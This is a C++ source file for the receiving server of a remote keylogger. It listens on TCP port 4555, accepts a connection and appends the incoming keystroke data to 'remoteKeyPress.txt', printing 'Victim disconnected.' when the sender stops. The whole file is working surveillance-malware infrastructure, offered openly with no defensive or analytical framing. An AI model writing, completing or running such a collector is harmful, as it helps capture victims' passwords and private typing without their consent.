#include <stdio.h>
#include<fstream>
#include<iostream>
#include <cstring>
#include <string.h>
#include <bits/stdc++.h> 
#include <stdlib.h>

#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h> // read(), write(), close()


#define MY_IP "127.0.0.1"
#define PORT 4555
#define MAX 100
#define LOG_PATH "remoteKeyPress.txt"

using namespace std;

void recvLog(int c);

int main(){
    //Create socket, bind listening
	int sockfd, cSpec, len;
	struct sockaddr_in servaddr, cli;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully created..\n");
	bzero(&servaddr, sizeof(servaddr));

	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port = htons(PORT);

	if ((bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))) != 0) {
		printf("socket bind failed...\n");
		exit(0);
	}
	else
		printf("Socket successfully binded..\n");

	if ((listen(sockfd, 5)) != 0) {
		printf("Listen failed...\n");
		exit(0);
	}
	else
		printf("Server listening..\n");
	len = sizeof(cli);
    //Accept Client and do things
    cSpec = accept(sockfd, (struct sockaddr*)&cli, &len);
    recvLog(cSpec);
    close(sockfd);
}

void recvLog(int c){
    char buffer[MAX];
	bzero(buffer, MAX);
	fstream f;
	//f.open(LOG_PATH, ios::out|ios::app);
    while (true){
		int status=recv(c, buffer, MAX, 0);
        if(status<=0){
            cout<<"\nVictim disconnected.\n";
            break;
        }
		//cout<<"recv CALLED\n";	
		f.open(LOG_PATH, ios::out|ios::app);
		f<<buffer;
		f.close();
		
        bzero(buffer, MAX);
    }
	//f.close();
}